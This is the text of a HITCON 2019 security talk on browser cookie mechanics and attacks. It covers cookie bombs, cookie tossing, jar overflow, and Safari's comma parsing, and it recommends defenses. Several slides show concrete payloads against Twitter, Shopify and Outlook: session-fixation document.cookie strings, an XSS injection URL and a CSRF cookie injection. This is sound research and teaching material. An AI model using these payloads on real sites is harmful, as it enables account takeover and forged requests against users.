The cookie monster 
in your browsers
@ﬁledescriptor
HITCON 2019
@ﬁledescriptor
• From Hong Kong 
• Pentester for Cure53
• Love WebApp Sec & Browser Sec
• Bug Bounty Hunter (#1 on Twitter's program)
Motivation
Motivation
Motivation
History
1966
The Dark Age
1994
1997
2000
Netscape's cookie_spec
RFC 2109
RFC 2965
Basic Syntax
Mechanism
More Attributes
Privacy Control
Obsoletes RFC 2109
Set-Cookie2 & Cookie2
No browser followed these specs!
The Modern Age
2011
2015
2016
2016
RFC 6265
Cookie Preﬁxes
(RFC6265bis)
Same-site Cookies
(RFC6265bis)
Strict Secure Cookies
(RFC6265bis)
Obsoletes RFC 2965
Summarizes reality
HttpOnly ﬂag
Improves Integrity 
across subdomains 
over secure channel
Kills CSRF & Co.
Prevents secure 
cookies overwrite from 
non-secure origin
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊🍊🍊🍊🍊🍊🍊🍊🍊🍊 
🍊
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪 
🍪
HTTP/1.1 200 OK
[...]
Set-Cookie: sid=123; path=/admin
document.cookie = 'lang=en'
HTTP Response
JavaScript API (write)
HTTP/1.1 200 OK
[...]
Set-Cookie: sid=123; path=/admin
document.cookie = 'lang=en'
POST /admin HTTP/1.1
[...]
Cookie: sid=123; lang=en
HTTP Response
JavaScript API (write)
Subsequent HTTP Request
document.cookie
// sid=123; lang=en
JavaScript API (read)
*Attributes do not appear in requests
Set-Cookie: sid=123; path=/admin; Secure
Name
Value
Attribute
Flag
Attribute
Flag
Expires
Max-Age Domain Path SameSite Secure HttpOnly
Attribute
Flag
Expires
Max-Age Domain Path SameSite Secure HttpOnly
We will focus on these attributes in this talk
Domain
Set-Cookie: foo=bar; domain=.example.com
example.com
sub.example.com
sub.of.sub.example.com
👀
👀
Domain to subdomains
Set-Cookie: foo=bar; domain=.example.com
sub.example.com
example.com
sub.of.sub.example.com
👀
👀
Subdomains to subdomains
Set-Cookie: foo=bar;
sub.example.com
example.com
sub.of.sub.example.com
👀
👀
Current domain
Dot or no Dot?
• They have no diﬀerence (old RFC vs new RFC style)
• Both widen the scope of a cookie to all (sub)domains
• The correct way to limit the scope is to not have the 
domain attribute
• Some websites add the domain attribute for all cookies
• If one of the subdomains is compromised, such 
cookies will be leaked to unauthorized parties 
– RFC 6265 (4.1.2.3.)
"Some existing user agents treat an absent Domain 
attribute as if the Domain attribute were present 
and contained the current host name."
Still isn’t ﬁxed in IE11 on Windows 7 / 8.1!
Cookie Bomb
• Most servers have a length limit on request headers
• When this limit is exceeded, HTTP 413 or 431 is returned
• Limited cookies injection can still result in client-side DoS 
• Domain & Expire attributes help persist the attack across 
(sub)domains.
https://example.com/aaa…aaa
https://twitter.com/#a
https://example.com/aaa…aaa
https://twitter.com/#b
https://example.com/aaa…aaa
https://twitter.com/#c
GET / HTTP/1.1
[...]
Cookie: ev_redir_a=aaa...aaa;
        ev_redir_b=aaa...aaa;
        ev_redir_c=aaa...aaa } 8kB+
Shared domains're vulnerable by design
e.g. github.io
Public Sufﬁx List
• Community curated
• Some domains cannot have 
cookies
• The same list that restricts 
domain=.com.tw
XSS+OAuth
• Say you have a boring XSS
• And the site is using OAuth
• Sounds like you can use the XSS to takeover accounts?
Expectation
https://google.com/oauth?client_id=example
HTTP/1.1 302 Found
Location: https://example.com/oauth/callback?code=123
Set-Cookie: sid=123
HTTP/1.1 302 Found
Location: https://example.com/home
Steal
Reality
https://google.com/oauth?client_id=example
HTTP/1.1 302 Found
Location: https://example.com/oauth/callback?code=123
Set-Cookie: sid=123
HTTP/1.1 302 Found
Location: https://example.com/home
Steal
1. Authorization code is single-use
2. Intermediate HTTP Redirect is transparent
XSS+🍪💣+OAuth
1. Perform Cookie Bomb Attack via XSS
2. Embed an iframe pointing to OAuth IdP
3. It redirects to target with the authorization code
4. Server rejects the request due to large header
5. Use XSS to get the authorization code from iframe URL 
https://example.com
https://google.com/oauth?client_id=example
https://example.com
https://example.com/oauth/callback?code=123
iframe.contentWindow.location.href
Path & HttpOnly
This is a valid request
True or False?
POST /admin HTTP/1.1
[...]
Cookie: csrf_token=foo; csrf_token=bar
Cookie Tossing
• Cookie key consists of the tuple (name, domain, path)
• Each cookie-key-value has their own attribute list
• (Sub)domains can force a cookie with the same name to 
other (sub)domains
• Browser sends all cookies of the same name without  
attributes
• Server thus has no way to tell which one is from which 
domain/path
GitHub Pages used to be on *.github.com
Scenario
• Had an XSS on ton.twitter.com where contents are static
• twitter.com uses auth_token for session ID and 
_twitter_sess for storing CSRF token
• Could modify _twitter_sess with an attacker-known value 
and have site-wide CSRF
• However it’s protected by HttpOnly
HttpOnly
• Cookies with this ﬂag cannot be read/write from 
JavaScript API 
• Safari before version 12 has a bug that allows writing to 
HttpOnly cookies with JavaScript API
• Cookie Tossing can also help “bypass” this ﬂag, as you 
can create a cookie with the same name but diﬀerent key 
tuple
Expectation
Name
Value
Domain
_twitter_sess
original
_twitter_sess attacker’s .twitter.com
POST /i/tweet/create HTTP/1.1
[...]
Cookie: _twitter_sess=attackers; _twitter_sess=original
authenticity_token=attacker-known
Reality
Name
Value
Domain
_twitter_sess
original
_twitter_sess attacker’s .twitter.com
POST /i/tweet/create HTTP/1.1
[...]
Cookie: _twitter_sess=original; _twitter_sess=attackers;
authenticity_token=attacker-known
–RFC 6265 (5.4)
   2.  The user agent SHOULD sort the cookie-list in the following
       order:
       *  Cookies with longer paths are listed before cookies with
          shorter paths.
       *  Among cookies that have equal-length path fields, cookies with
          earlier creation-times are listed before cookies with later
          creation-times.
Precedence matters
• Specs do not mention how to handle duplicate cookies
• Most servers accept the ﬁrst occurrence of cookies with 
the same name (think of HPP)
• Most browsers place cookies created earlier ﬁrst
–RFC 6265 (5.4)
   2.  The user agent SHOULD sort the cookie-list in the following
       order:
       *  Cookies with longer paths are listed before cookies with
          shorter paths.
       *  Among cookies that have equal-length path fields, cookies with
          earlier creation-times are listed before cookies with later
          creation-times.
Revised Attack
Name
Value
Domain
Path
_twitter_sess
original
/
_twitter_sess attacker’s .twitter.com
/i/
POST /i/tweet/create HTTP/1.1
[...]
Cookie: _twitter_sess=attackers; _twitter_sess=original
authenticity_token=attacker-known
–RFC 6265 (6.1)
Practical user agent implementations have limits on the number and
   size of cookies that they can store.  General-use user agents SHOULD
   provide each of the following minimum capabilities:
   o  At least 4096 bytes per cookie (as measured by the sum of the
      length of the cookie's name, value, and attributes).
   o  At least 50 cookies per domain.
Overﬂowing Cookie Jar
• Another way to “overwrite” a HttpOnly cookie is to 
remove it
• Browsers have a limitation on how many cookies a 
domain can have
• When there is no space, older cookies will get deleted
• Drawback: it’s not always easy to know how many 
cookies a victim has (tracking cookies are unpredictable)
More Cookie Tossing 
Application
Self-XSS to full XSS
Selectively forcing attacker’s session cookie on 
certain paths
https://attacker.myshopify.com
https://attacker.myshopify.com/admin/oauth/authorize?client_id=editor
https://script-editor.shopifycloud.com/oauth/callback?code=attackers
document.cookie='_master_udr=attackers;path=/admin/oauth
https://victim.myshopify.com/admin/oauth/authorize?client_id=editor
https://script-editor.shopifycloud.com/oauth/callback?code=victims
Login “CSRF”
Re-login victim 
Self-XSS in iframe executing with victim’s session
Session Fixation
Forcing attacker’s session cookie with a subdomain 
XSS 
https://script-editor.shopifycloud.com
document.cookie='_flow_session=attackers;domain=.shopifycloud.com'
https://victim.myshopify.com/admin/oauth/authorize?client_id=ﬂow
GET /oauth/callback?code=victims HTTP/1.1
Host: flow.shopifycloud.com
Cookie: _flow_session=attackers
Force a session cookie scoped to .shopifycloud.com using XSS
OAuth redirect with authorization code
Implementation 
Discrepancy
Multiple Cookies at Once?
• We can only set one cookie at a time in a single Set-
Cookie header
• However, the older specs allow setting multiple in a single 
Set-Cookie header
Cookie based XSS
Exploiting limited Cookie Injection with Safari
–RFC 2109 (4.2.2)
“Informally, the Set-Cookie response header 
comprises the token Set-Cookie:, followed by a 
comma-separated list of one or more cookies.”
Set-Cookie: foo=123; path=/admin; HttpOnly;, bar=456; Secure
GET /admin HTTP/1.1
[...]
Cookie: foo=123; bar=456
Works in Safari before version 10
https://outlook.live.com/owa/?realm=hotmail.com;, ClientId='-alert(2)-'
HTTP/1.1 200 OK
[...]
Set-Cookie: realm=hotmail.com;, ClientId='-alert(2)-'
GET / HTTP/1.1
[...]
Cookie: realm=hotmail.com; ClientId='-alert(2)-'
window.clientId = ''-alert(2)-'';
Safari sets 2 cookies
CSRF Cookie Injection
Server accepting comma separated cookies
–RFC 2965 (3.3.4)
“For backward compatibility, the separator in the 
Cookie header is semi-colon (;) everywhere. A 
server SHOULD also accept comma (,) as the 
separator between cookie-values for future 
compatibility.”
http://blackfan.ru/r/,m5_csrf_tkn=x,;domain=.twitter.com;path=/
__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcct=/
r/,m5_csrf_tkn=x
POST /messages/follow HTTP/1.1
[...]
Cookie: __utmz=123456.123456789.11.2.utmcsr=blackfan.ru|
utmccn=(referral)|utmcct=/r/,m5_csrf_tkn=x
m5_csrf_tkn=x
Cookie set by Google Analytics on translation.twitter.com scoped to .twitter.com
Twitter’s server parses it as 2 cookies
Defense
Cookie Preﬁxes
• Cookies preﬁxed with __Host- cannot have Domain 
attribute
• This prevents (sub)domains from forcing a cookie the 
current domain doesn’t want
• Cookies intended for (sub)domains are still vulnerable to 
Cookie Tossing
• Use a separate domain for user generated assets
Servers must only 
follow RFC 6265
PSA: CSRF & others will be dead in 2020😢
Q&A
ﬁnd me on Twitter @ﬁledescriptor